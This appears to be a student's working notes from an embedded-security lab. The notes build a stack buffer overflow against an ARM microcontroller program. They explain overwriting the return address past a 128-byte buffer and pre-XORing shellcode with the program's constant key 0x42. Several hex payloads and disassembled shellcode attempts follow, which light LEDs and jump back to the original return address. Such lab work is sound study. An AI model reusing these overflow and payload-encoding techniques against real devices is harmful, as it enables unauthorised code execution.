@@ -1,0 +1,366 @@
+&ciphertext is 0x100007D4
+&plaintext is 0x100007DC
+&lr is &0x100007FC (LR is link register, always points to return adress when a function gets called)
+
+lr-cipher diff is 40 Bytes
+lr-plain diff is 32 Bytes
+
+
+new lr &100007c4
+new diff is 24 byte
+
+
+Notes about crypto:
+
+The bin code being fed to the Stack starting from the &plaintext adress, is copied to the buffer, thats where we want to have more than 128 byte in order to write our exploit 
+inside buf, and then overwrite the locations after the 128, until 140 we reach the lr with return adress of encrypt function, we need to write in little endian additional 4 bytes so we will write 144 byte.
+Problem is that the bin code we insert, is being copied to the buffer and the crypted, meaning that our exploit code will not be executable.
+We need to crypt bin code with same key before feeding to program.
+
+encrypt in crypto.c, takes the 8 byte from the buffer, and XOR with key[nonce[] % 8], where nonce is an array of random numbers between 0-255.
+Lucky for us key has 8 elements and they are all the same, so no matter what nonce is, we will always have key = 0x42.
+
+XOR is a reversible operation, meaning that if we do: 
+
+0x50 XOR 0x42 = 0x12
+and now if we want to reverse:
+0x12 XOR 0x42 = 0x50
+
+so we just have to XOR before we feed to program
+
+another issue.
+when we inject the code we will overwrite the original adress the lr was pointing to in 0x100007c4, with the adress of our buffer.
+this will allow the pc to execute our program, but it will not go back to the original return adress: 0x08000325, so it will not keep on working as intended (print the cypher back)
+we need to add an instruction at the end of our code, that points the pc back to the original adress.
+
+
+
+
+
+
+
+
+10 00 00 00 1C 30 9F E5 10 20 B0 E3 10 20 83 E5 18 30 9F E5 F9 10 00 10 00 00 30 93 E5 14209FE5003082E50030B0E32600000001FFFFFFFFFFFFFFFFFFFFFFFFD4070010
+ 
+
+ 80002b8:	4b07       ldr r3, [pc, #28]	#80002d8
+ 80002ba:	2210      	movs	r2, #16
+ 80002bc:	611a      	str	r2, [r3, #16]
+ 80002be:	4b06      	ldr	r3, [pc, #24]	#80002d8
+ 80002c0:	681b      	ldr	r3, [r3, #0]
+ 80002c2:	4a05      	ldr	r2, [pc, #20]	#80002d8
+ 80002c4:	f043 0301 	orr.w	r3, r3, #1
+ 80002c8:	6013      	str	r3, [r2, #0]
+ 80002ca:	2300      	movs	r3, #0
+
+
+
+ 100000001C309FE51020B0E3102083E518309FE5F910001000003093E514209FE5003082E50030B0E32600000001FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC070010
+
+
+
+ 07 4b 10 22 1a 61 06 4b 1b 68 05 4a 43 f0 01 03 13 60 00 23 ff ff ff ff ff ff ff ff ff dc 07 00 10
+
+074b10221a61064b1b68054a43f0010313600023ffffffffffffffffffDC070010
+
+1a61064b1b68054a43f0010313600023ffffffffffffffffffdc070010
+
+1a6113600023 ffffffffffffffffffffffffffffffffffffffffffffffffffffdd070010
+
+102083e5003082e50030b0e3ffffffffffffffffffffffffdd070010 
+
+
+
+ldr	r3, [pc, #28]	#80002d8
+movs	r2, #16
+str	r2, [r3, #16]
+ldr	r3, [pc, #24]	 #80002d8
+ldr	r3, [r3, #0]
+ldr	r2, [pc, #20]	#80002d8
+orr.w	r3, r3, #1
+str	r3, [r2, #0]
+movs	r3, #0
+
+23 58 22 51 61 42 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff dd 07 00 10
+
+
+05 4b 10 22 1a 60 04 4b 1a 68 52 f0 01 02 1a 60 00 bf ff ff ff ff ff ff ff ff ff ff ff ff ff ff dd 07 00 10
+
+movw    r3, #0x8000      
+movt    r3, #0x4802      
+ldr     r2, [r3, #0]     
+orr.w   r2, r2, #1       
+str     r2, [r3, #0]     
+movs    r3, #0           
+
+
+48 f2 00 03 c4 f6 02 03 1a 68 42 f0 01 02 1a 60 00 23 ff ff ff ff ff ff ff ff ff ff ff ff ff ff dd 07 00 10 
+
+48 f2 00 03 c4 f6 02 03 1a 68 42 f0 01 02 1a 60 00 23 
+
+mov sp , pc
+ldr	r2, [pc, #36]	0x8000300
+movs	r1, #0
+ldr	r0, [pc, #36]	0x8000304
+ldr	r2, [pc, #28]	0x8000300
+movs	r1, #1
+ldr	r0, [pc, #28]	0x8000304
+movs	r1, #0
+ldr	r0, [pc, #20]	0x8000304
+movs	r1, #1
+ldr	r0, [pc, #12]	0x8000304
+
+
+09 4a 00 21 09 48 07 4a 01 21 07 48 00 21 05 48 01 21 03 48 
+
+mov sp , pc
+push	{r7, lr}
+add	r7, sp, #0
+ldr	r2, [pc, #36]	
+movs	r1, #0
+ldr	r0, [pc, #36]	
+bl	0x80003dc <XMC_GPIO_Init>
+ldr	r2, [pc, #28]	
+movs	r1, #1
+ldr	r0, [pc, #28]	
+bl	0x80003dc <XMC_GPIO_Init>
+
+
+
+09 4a 00 21 09 48 07 4a 01 21 07 48 00 21 05 48 01 21 03 48 
+
+
+Dump of assembler code for function turnon:
+   0x080002d4 <+0>:	push	{r7, lr}                                    push lr into stack r7
+   0x080002d6 <+2>:	add	r7, sp, #0                                      r7 = sp + 0
+   0x080002d8 <+4>:	ldr	r2, [pc, #36]	                               r2 = pc + 36
+   0x080002da <+6>:	movs	r1, #0                                      r1 = 0
+   0x080002dc <+8>:	ldr	r0, [pc, #36]	                                   r0 = pc + 36
+   0x080002e2 <+14>:ldr	r2, [pc, #28]                                   r2 = pc+28
+   0x080002e4 <+16>:movs	r1, #1                                  r1 = 1
+   0x080002e6 <+18>:ldr	r0, [pc, #28]	                              r0 = pc+28
+
+
+fd 46 80 b5 00 af 09 4a 00 21 09 48 07 4a 01 21 07 48 
+
+
+bf 04 0a b0 43 50 86 b4 40 40 c2 63 93 31 8b 4b
+93 32 bc a5 bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+42 42 42 42 42 42 42 42 42 42 42 42 39 07 00 10
+
+
+
+
+bf 04 0a b0 43 50 86 b4 40 40 40 a2 bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+ff ff ff ff ff ff ff ff ff ff ff ff 39 07 00 10
+
+questo funzia credo
+bf 04 0a b0 43 50 86 b4 40 40 46 63 93 32 47 a2
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+ff ff ff ff ff ff ff ff ff ff ff ff 39 07 00 10
+
+bf 04 0a b0 43 50 86 b4 40 40 c2 63 93 31 8b 4b
+93 32 cd 04 bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+ff ff ff ff ff ff ff ff ff ff ff ff 39 07 00 10
+
+
+mov sp , pc
+movw r2 , #33025 ; 0 x8101
+movt r2 , #18434 ; 0 x4802
+movs r1 , #32897 ; 0 x8080
+strb r1 , [ r2 , #15]
+movs r1 , #4 ; 0x4
+strb r1 , [ r2 , #3]
+mov pc , r1
+
+
+bf 04 0a b0 43 50 86 b4 40 40 41 63 93 31 93 32
+b9 a5 bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+ff ff ff ff ff ff ff ff ff ff ff ff 39 07 00 10
+
+
+
+
+0x10000738:	ldr	r3, [pc, #40]	@ (0x10000764) loads adress pointed by this
+0x1000073a:	ldr	r3, [r3, #0]    ; the adress pointed is 0x48028110, so r3 = this
+0x1000073c:	ldr	r2, [pc, #36]	@ (0x10000764) same as before
+0x1000073e:	orr.w	r3, r3, #32768	@ 0x8000 flag per IOCR led 1.1
+0x10000742:	orr.w	r3, r3, #128	@ 0x80 flag iocr 1.0
+0x10000746:	str	r3, [r2, #0] ; store modified adress to IOCR -> turns leds as output
+0x10000748:	ldr	r3, [pc, #28]	@ (0x10000768) loads adress to out port control
+0x1000074a:	ldr	r3, [r3, #0] ; same as before
+0x1000074c:	ldr	r2, [pc, #24]	@ (0x10000768)
+0x1000074e:	orr.w	r3, r3, #3   ; flag per port out led 1.1 e 1.0
+0x10000752:	str	r3, [r2, #0] ; turn led on
+0x10000754:	ldr.w	pc, [pc, #4]	@ 0x1000075c load instruction saved at this adress
+0x10000758:			@ <UNDEFINED> instruction: 0xffffffff
+0x1000075c:	lsls	r5, r4, #12
+0x1000075e:	lsrs	r0, r0, #32
+0x10000760:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000764:	strh	r0, [r2, #8]
+0x10000766:	ldr	r0, [pc, #8]	@ (0x10000770)
+0x10000768:	strh	r0, [r0, #8]
+0x1000076a:	ldr	r0, [pc, #8]	@ (0x10000774)
+0x1000076c:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000770:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000774:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000778:			@ <UNDEFINED> instruction: 0xffffffff
+0x1000077c:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000780:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000784:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000788:			@ <UNDEFINED> instruction: 0xffffffff
+0x1000078c:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000790:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000794:			@ <UNDEFINED> instruction: 0xffffffff
+0x10000798:			@ <UNDEFINED> instruction: 0xffffffff
+0x1000079c:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007a0:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007a4:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007a8:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007ac:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007b0:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007b4:			@ <UNDEFINED> instruction: 0xffffffff
+0x100007b8:	lsls	r0, r2, #10
+0x100007ba:	lsrs	r0, r0, #32
+0x100007bc:	movs	r0, r3
+0x100007be:	movs	r0, r0
+0x100007c0:	movs	r0, r0
+0x100007c2:	movs	r0, r0
+0x100007c4:	lsls	r1, r7, #28
+
+push	{r7, lr}
+add	r7, sp, #0
+ldr	r2, [pc, #36]
+movs	r1, #0
+ldr	r0, [pc, #36]	
+bl	0x80003dc 
+ldr	r2, [pc, #28]	
+movs	r1, #1
+ldr	r0, [pc, #28]	
+bl	0x80003dc 
+movs	r1, #0
+ldr	r0, [pc, #20]	
+bl	0x80002b2 
+movs	r1, #1
+ldr	r0, [pc, #12]	
+bl	0x80002b2 
+nop
+pop	{r7, pc}
+subs	r0, r2, r5
+lsrs	r0, r0, #32
+strh	r0, [r0, #8]
+ldr	r0, [pc, #8]
+
+
+mov sp , pc
+movw r3 , #33025 
+movt r3 , #18434 
+movs r2 , #128 
+strb r2 , [ r3 , #15]
+lsrs r2 , r2 , #7
+strb r2 , [ r3 , #3]
+movw r0, #0x0325      
+movt r0, #0x0800      
+mov pc, r0
+
+80B500AF094A0021094800F04F1002E0007DF8074A0121074800F078F801002F000FFF7DFFF01210348FFF7DBFF
+
+push {r7, lr}
+add  r7, sp, #0
+ldr  r2, [pc, #0x24]
+movs r1, #0
+ldr  r0, [pc, #0x24]
+and  r0, r0, #0x4f004f
+b    #0x16
+ldrb r0, [r0, #0x14]
+lsls r0, r7, #0x1f
+lsls r2, r1, #5
+lsls r1, r4, #0x1c
+lsls r0, r1, #1
+ldrb r0, [r6, #3]
+asrs r0, r7, #3
+bl   #0x2e22
+svc  #0xf7
+lsls r7, r7, #7
+lsls r1, r4, #0xc
+movw r0, #0x0325      
+movt r0, #0x0800      
+mov pc, r0
+
+
+
+ 		ldr	r3, .L3
+
+ 		movs	r2, #128
+ 		str	r2, [r3, #16]
+
+
+ 		ldr	r3, .L3
+ 		ldr	r3, [r3]
+ 		ldr	r2, .L3
+
+ 		orr	r3, r3, #1
+ 		str	r3, [r2]
+	
+	.L3:
+ 		.word	1208123648
+
+
+Quello Giusto:
+
+ 		ldr	r3, .L3
+ 		ldr	r3, [r3, #16]
+ 		ldr	r2, .L3
+
+ 		orr	r3, r3, #32768
+ 		orr	r3, r3, #128
+ 		str	r3, [r2, #16]
+
+
+
+ 		ldr	r3, .L3
+ 		ldr	r3, [r3]
+ 		ldr	r2, .L3
+
+ 		orr	r3, r3, #3
+ 		str	r3, [r2]
+
+        ldr.w	pc, [pc, #4]
+		movs	r0, r0
+        movs	r0, r0
+        lsls	r5, r4, #12
+        lsrs	r0, r0, #32
+        .L3:
+    	.word	1208123648
